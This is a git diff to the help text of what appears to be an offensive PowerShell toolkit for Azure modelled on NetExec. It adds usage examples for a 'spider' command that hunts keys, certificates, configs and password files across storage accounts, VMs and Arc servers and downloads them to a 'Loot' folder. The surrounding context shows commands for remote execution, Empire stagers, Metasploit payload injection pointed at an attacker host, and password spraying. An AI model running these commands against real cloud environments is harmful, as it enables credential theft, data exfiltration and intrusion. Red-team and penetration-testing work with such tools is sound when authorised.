@@ -78,6 +78,7 @@ function Show-Help {
         @{Name="exec"; Auth="Required"; Description="Execute remote commands on Azure VMs (mimics nxc smb -x/-X)"}
         @{Name="empire-exec"; Auth="Required"; Description="Execute Empire stager on Azure VMs (mimics nxc -M empire_exec)"}
         @{Name="met-inject"; Auth="Required"; Description="Inject Metasploit payload on Azure VMs (mimics nxc -M met_inject)"}
+        @{Name="spider"; Auth="Required"; Description="Spider Azure Storage for sensitive files (mimics nxc smb --spider / spider_plus)"}
         @{Name="help"; Auth="N/A"; Description="Display this help message"}
     )
     
@@ -132,6 +133,23 @@ function Show-Help {
     Write-Host "    .\azx.ps1 met-inject -SRVHOST 10.10.10.1 -SRVPORT 8080 -RAND abc123 -VMName vm-01"
     Write-Host "    .\azx.ps1 met-inject -SRVHOST 10.10.10.1 -SRVPORT 443 -RAND xyz789 -SSL -AllVMs"
     Write-Host "    .\azx.ps1 met-inject -SRVHOST 10.10.10.1 -SRVPORT 8080 -RAND abc123 -ProxyHost proxy.corp -ProxyPort 8080 -VMName vm-01"
+
+    Write-ColorOutput -Message "`n[*] Spider Examples (NetExec --spider / spider_plus equivalent):" -Color "Yellow"
+    Write-Host "    # Storage Spider (default - blobs and file shares)"
+    Write-Host "    .\azx.ps1 spider                                           - Spider all storage accounts"
+    Write-Host "    .\azx.ps1 spider -Pattern 'txt,docx,key,pem,pfx,config'    - Pattern filter"
+    Write-Host "    .\azx.ps1 spider -Pattern 'pem,pfx,key' -Download -OutputFolder C:\Loot"
+    Write-Host "    .\azx.ps1 spider -StorageAccountTarget 'mystorageacct' -BlobsOnly"
+    Write-Host ""
+    Write-Host "    # VM Spider (file systems on Azure VMs via exec)"
+    Write-Host "    .\azx.ps1 spider -VMName 'vm-web-01' -Pattern 'key,pem,config'"
+    Write-Host "    .\azx.ps1 spider -AllVMs -Pattern 'password,credential' -StartPath 'C:\Users'"
+    Write-Host "    .\azx.ps1 spider -VMName 'vm-01' -Download -ExcludePaths 'Windows,Program Files'"
+    Write-Host ""
+    Write-Host "    # Device Spider (Arc-enabled servers)"
+    Write-Host "    .\azx.ps1 spider -DeviceName 'arc-server-01' -Pattern 'key,pem'"
+    Write-Host "    .\azx.ps1 spider -AllDevices -StartPath '/etc' -Pattern 'conf,key'"
+    Write-Host "    .\azx.ps1 spider -DeviceName 'arc-srv' -Download -MaxFileSize 5"
 
     Write-ColorOutput -Message "`n[*] Password Spray Examples (NetExec-style):" -Color "Yellow"
     Write-Host "    .\azx.ps1 spray -Domain target.com -UserFile users.txt -Password 'Summer2024!'"
